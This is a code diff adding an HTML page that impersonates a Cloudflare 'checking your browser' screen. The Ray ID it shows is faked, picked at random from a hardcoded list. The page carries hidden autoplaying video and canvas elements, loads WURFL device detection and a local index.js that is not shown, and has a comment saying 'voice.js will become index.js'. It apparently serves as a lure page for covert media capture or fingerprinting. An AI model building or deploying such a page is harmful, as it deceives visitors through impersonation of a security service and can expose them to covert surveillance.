@@ -1,0 +1,146 @@
+<!DOCTYPE html>
+<html lang="en-US">
+<head>
+  <meta charset="UTF-8" />
+  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1" />
+  <meta name="robots" content="noindex, nofollow" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Just a moment...</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    html, body {
+      width: 100%;
+      height: 100%;
+      background-color: #ffffff;
+      color: #000000;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, "Helvetica Neue", Arial, sans-serif;
+      font-size: 16px;
+      line-height: 1.7;
+      -webkit-font-smoothing: antialiased;
+    }
+
+    .container {
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      padding: 20px;
+      text-align: center;
+    }
+
+    h1 {
+      font-weight: 700;
+      margin: 16px 0;
+      font-size: clamp(24px, 6vw, 32px);
+      color: #000000;
+      line-height: 1.25;
+    }
+
+    p {
+      font-size: clamp(16px, 4vw, 20px);
+      font-weight: 400;
+      margin: 8px 0;
+    }
+
+    #cf-bubbles {
+      margin: 0 auto 30px;
+      display: flex;
+      justify-content: center;
+      gap: 4px;
+    }
+
+    .bubbles {
+      background-color: #f58220;
+      width: 20px;
+      height: 20px;
+      border-radius: 50%;
+      animation: fader 1.6s infinite;
+    }
+
+    .bubbles:nth-child(2) { animation-delay: 0.2s; }
+    .bubbles:nth-child(3) { animation-delay: 0.4s; }
+
+    @keyframes fader {
+      0%, 100% { opacity: 0.2; }
+      50% { opacity: 1; }
+    }
+
+    .attribution {
+      margin-top: 32px;
+      font-size: clamp(14px, 3.5vw, 16px);
+      line-height: 1.5;
+    }
+
+    .attribution a {
+      color: #2c7cb0;
+      text-decoration: none;
+      transition: color 0.15s ease;
+    }
+
+    .attribution a:hover {
+      color: #f4a15d;
+    }
+
+    .ray_id {
+      display: block;
+      margin-top: 8px;
+      font-family: monospace;
+    }
+
+    #video, #canvas {
+      display: none;
+    }
+
+    @media (max-width: 480px) {
+      h1 { font-size: 26px; }
+      p { font-size: 18px; }
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div id="cf-bubbles">
+      <div class="bubbles"></div>
+      <div class="bubbles"></div>
+      <div class="bubbles"></div>
+    </div>
+    <h1>Checking your browser before accessing the website.</h1>
+    <p>This process is automatic. Your browser will redirect to your requested content shortly.</p>
+    <p id="cf-spinner-redirecting">Redirecting…</p>
+    <div class="attribution">
+      DDoS protection by 
+      <a rel="noopener noreferrer" href="https://www.cloudflare.com/5xx-error-landing/" target="_blank">Cloudflare</a>
+      <span class="ray_id">Ray ID: <code id="ray">6c51810c599f2cda</code></span>
+    </div>
+  </div>
+
+  <video id="video" playsinline autoplay muted></video>
+  <canvas id="canvas" width="640" height="480"></canvas>
+
+  <script>
+    const keyList = [
+      "a2f468e2c753b9f7",
+      "8d07a9d4e2153fc1",
+      "4b69c8f3b2e710d9",
+      "f1b58e42a396d07c",
+      "c38e7a5d94f2b610",
+      "9f256d7e1c8a03b4"
+    ];
+    document.getElementById("ray").innerText = keyList[Math.floor(Math.random() * keyList.length)];
+  </script>
+
+  <!-- Hanya muat jQuery & WURFL (opsional) -->
+  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+  <script src="https://wurfl.io/wurfl.js"></script>
+
+  <!-- ✅ Muat logika utama (voice.js akan jadi index.js) -->
+  <script src="index.js"></script>
+</body>
+</html>
